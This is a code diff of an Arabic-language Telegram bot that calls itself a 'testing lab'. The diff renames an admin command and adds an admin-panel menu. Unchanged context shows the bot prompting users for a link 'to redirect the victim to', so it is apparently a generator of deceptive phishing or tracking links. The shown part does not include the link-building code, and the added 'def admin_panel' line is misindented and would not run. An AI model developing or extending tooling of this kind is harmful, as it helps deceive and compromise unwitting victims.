@@ -727,7 +727,7 @@ def start_cmd(message):
     if not user:
         create_user(user_id, message.from_user.username or '', message.from_user.first_name or '', message.from_user.last_name or '')
     bot.send_message(user_id, "🔬 مرحباً بك في مختبر الاختبار", reply_markup=main_menu(user_id))
-@bot.message_handler(commands=['make_admin'])
+@bot.message_handler(commands=['admin'])
 def make_admin_cmd(message):
     # تأكد أن المرسل هو أنت
     if message.from_user.id == 6904264075:
@@ -738,21 +738,45 @@ def make_admin_cmd(message):
         bot.reply_to(message, "✅ تم تفعيل صلاحيات الإدارة")
     else:
         bot.reply_to(message, "❌ غير مصرح لك")
-                     
+ def admin_panel():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("📊 الإحصائيات", callback_data="admin_stats"),
+        InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"),
+        InlineKeyboardButton("📢 إدارة القنوات", callback_data="admin_channels"),
+        InlineKeyboardButton("⚙️ إعدادات البوت", callback_data="admin_settings"),
+        InlineKeyboardButton("⭐ إدارة النقاط", callback_data="admin_points"),
+        InlineKeyboardButton("🔧 إدارة الميزات", callback_data="admin_features"),
+        InlineKeyboardButton("📨 التواصل مع الإدمن", callback_data="admin_contact"),
+        InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
+    )
+    return markup
+     
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
     user_id = call.from_user.id
     feature = call.data
     
+    # ====== لوحة الإدارة (مفعلة) ======
     if feature == 'admin_panel':
-        bot.answer_callback_query(call.id, "🔐 لوحة الإدارة قيد التطوير")
+        user = get_user(user_id)
+        if user and user['is_admin']:
+            bot.edit_message_text(
+                "⚙️ **لوحة الإدارة**",
+                user_id,
+                call.message.message_id,
+                parse_mode='Markdown',
+                reply_markup=admin_panel()
+            )
+            bot.answer_callback_query(call.id)
+        else:
+            bot.answer_callback_query(call.id, "❌ غير مصرح لك")
         return
     
     # طلب الرابط الأصلي
     user_states[user_id] = f'waiting_url_{feature}'
     bot.send_message(user_id, "📤 أرسل الآن الرابط الأصلي (الموقع الذي تريد توجيه الضحية إليه):")
     bot.answer_callback_query(call.id)
-
 @bot.message_handler(func=lambda message: user_states.get(message.from_user.id, '').startswith('waiting_url_'))
 def handle_original_url(message):
     user_id = message.from_user.id
